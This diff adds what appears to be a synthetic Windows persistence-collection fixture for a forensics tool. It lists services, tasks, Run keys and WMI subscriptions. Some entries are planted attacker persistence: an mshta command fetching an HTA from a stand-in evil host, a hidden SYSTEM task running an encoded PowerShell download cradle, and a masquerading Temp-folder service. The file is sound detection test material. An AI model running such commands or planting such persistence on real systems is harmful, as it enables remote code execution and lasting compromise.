@@ -1,0 +1,183 @@
+{
+  "schema_version": 1,
+  "artifact": "persistence",
+  "collected_at": "2026-03-10T12:00:00Z",
+  "status": "ok",
+  "sources": [
+    "Win32_Service",
+    "Get-ScheduledTask",
+    "registry:Run/RunOnce",
+    "Win32_StartupCommand",
+    "startup folders",
+    "root\\subscription"
+  ],
+  "notes": [
+    "Not covered: COM hijacking, AppInit/AppCert DLLs, IFEO debuggers, LSA/authentication packages, drivers, BITS jobs, browser extensions, DLL search-order issues."
+  ],
+  "errors": [],
+  "records": [
+    {
+      "kind": "service",
+      "name": "Spooler",
+      "display_name": "Print Spooler",
+      "start_mode": "Auto",
+      "state": "Running",
+      "run_as": "LocalSystem",
+      "exec_binary": "C:\\Windows\\System32\\spoolsv.exe",
+      "exec_expanded": "C:\\Windows\\System32\\spoolsv.exe",
+      "exec_exists": true,
+      "exec_sha256": "94c3ffd8519716ed2e3d7e899144dd21c84587a0379433222c81d67232215d0e",
+      "signature_status": "Valid",
+      "signer": "CN=Synthetic Software Corp",
+      "command": "C:\\Windows\\System32\\spoolsv.exe",
+      "unquoted_path_with_spaces": false
+    },
+    {
+      "kind": "service",
+      "name": "AcmeBackup",
+      "display_name": "Acme Backup",
+      "start_mode": "Auto",
+      "state": "Stopped",
+      "run_as": "LocalSystem",
+      "exec_binary": "C:\\Program Files\\Acme Backup\\backup.exe",
+      "exec_expanded": "C:\\Program Files\\Acme Backup\\backup.exe",
+      "exec_exists": false,
+      "command": "C:\\Program Files\\Acme Backup\\backup.exe -service",
+      "unquoted_path_with_spaces": true
+    },
+    {
+      "kind": "service",
+      "name": "WinUpdateHelper",
+      "display_name": "Windows Update Helper",
+      "start_mode": "Auto",
+      "state": "Running",
+      "run_as": "LocalSystem",
+      "exec_binary": "C:\\Users\\analyst\\AppData\\Local\\Temp\\updater.exe",
+      "exec_expanded": "C:\\Users\\analyst\\AppData\\Local\\Temp\\updater.exe",
+      "exec_exists": true,
+      "exec_sha256": "ac42db2b771c6400dd73ea1072446ea2af0719b733c12c0907ad76c85c0a4cce",
+      "signature_status": "NotSigned",
+      "signer": null,
+      "command": "\"C:\\Users\\analyst\\AppData\\Local\\Temp\\updater.exe\" --service",
+      "unquoted_path_with_spaces": false
+    },
+    {
+      "kind": "scheduled_task",
+      "name": "GoogleUpdate",
+      "task_path": "\\",
+      "state": "Ready",
+      "author": "Synthetic",
+      "run_as": "SYSTEM",
+      "run_level": "Highest",
+      "hidden": false,
+      "action_index": 0,
+      "last_run": "2026-03-10T06:00:00Z",
+      "next_run": "2026-03-10T18:00:00Z",
+      "exec_binary": "C:\\Program Files\\Synthetic\\update.exe",
+      "exec_expanded": "C:\\Program Files\\Synthetic\\update.exe",
+      "exec_exists": true,
+      "exec_sha256": "cd9458d9ab0923a1faa80cdfd7ebb17eeb1df7d9e9618d35b507a01529ebfb1b",
+      "signature_status": "Valid",
+      "signer": "CN=Synthetic Software Corp",
+      "command": "C:\\Program Files\\Synthetic\\update.exe /ua"
+    },
+    {
+      "kind": "scheduled_task",
+      "name": "SystemHealthCheck",
+      "task_path": "\\Microsoft\\",
+      "state": "Ready",
+      "author": "analyst",
+      "run_as": "SYSTEM",
+      "run_level": "Highest",
+      "hidden": true,
+      "action_index": 0,
+      "last_run": "2026-03-10T10:00:00Z",
+      "next_run": "2026-03-10T11:00:00Z",
+      "exec_binary": "powershell.exe",
+      "exec_expanded": "powershell.exe",
+      "exec_exists": null,
+      "command": "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+    },
+    {
+      "kind": "run_key",
+      "registry_key": "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "name": "SecurityHealth",
+      "exec_binary": "%windir%\\system32\\SecurityHealthSystray.exe",
+      "exec_expanded": "%windir%\\system32\\SecurityHealthSystray.exe",
+      "exec_exists": null,
+      "command": "%windir%\\system32\\SecurityHealthSystray.exe"
+    },
+    {
+      "kind": "run_key",
+      "registry_key": "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "name": "Updater",
+      "exec_binary": "C:\\Users\\analyst\\AppData\\Local\\Temp\\updater.exe",
+      "exec_expanded": "C:\\Users\\analyst\\AppData\\Local\\Temp\\updater.exe",
+      "exec_exists": true,
+      "exec_sha256": "ac42db2b771c6400dd73ea1072446ea2af0719b733c12c0907ad76c85c0a4cce",
+      "signature_status": "NotSigned",
+      "signer": null,
+      "command": "\"C:\\Users\\analyst\\AppData\\Local\\Temp\\updater.exe\" --silent"
+    },
+    {
+      "kind": "run_key",
+      "registry_key": "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "name": "Loader",
+      "exec_binary": "mshta.exe",
+      "exec_expanded": "mshta.exe",
+      "exec_exists": null,
+      "command": "mshta.exe http://evil.example.test/a.hta"
+    },
+    {
+      "kind": "startup_command",
+      "name": "SecurityHealth",
+      "location": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "user": "Public",
+      "exec_binary": "%windir%\\system32\\SecurityHealthSystray.exe",
+      "exec_expanded": "%windir%\\system32\\SecurityHealthSystray.exe",
+      "exec_exists": null,
+      "command": "%windir%\\system32\\SecurityHealthSystray.exe"
+    },
+    {
+      "kind": "startup_folder_item",
+      "name": "helper.lnk",
+      "folder": "C:\\Users\\analyst\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+      "path": "C:\\Users\\analyst\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\helper.lnk",
+      "size": 1024,
+      "modified": "2026-03-10T09:02:00Z",
+      "sha256": "9d42681e98783f3bd3b5d054797fed7c0d82281cc9274ecc49341cc00478d1ec"
+    },
+    {
+      "kind": "winlogon_value",
+      "name": "Shell",
+      "value": "explorer.exe"
+    },
+    {
+      "kind": "winlogon_value",
+      "name": "Userinit",
+      "value": "C:\\Windows\\system32\\userinit.exe,"
+    },
+    {
+      "kind": "wmi_subscription",
+      "subscription_part": "Filter",
+      "name": "SysFilter",
+      "consumer_type": null,
+      "filter": null,
+      "consumer": null,
+      "query": "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'",
+      "command": "",
+      "has_script_text": false
+    },
+    {
+      "kind": "wmi_subscription",
+      "subscription_part": "Consumer",
+      "name": "SysConsumer",
+      "consumer_type": "CommandLineEventConsumer",
+      "filter": null,
+      "consumer": null,
+      "query": "",
+      "command": "cmd.exe /c C:\\Users\\Public\\x.exe --token [REDACTED]",
+      "has_script_text": false
+    }
+  ]
+}
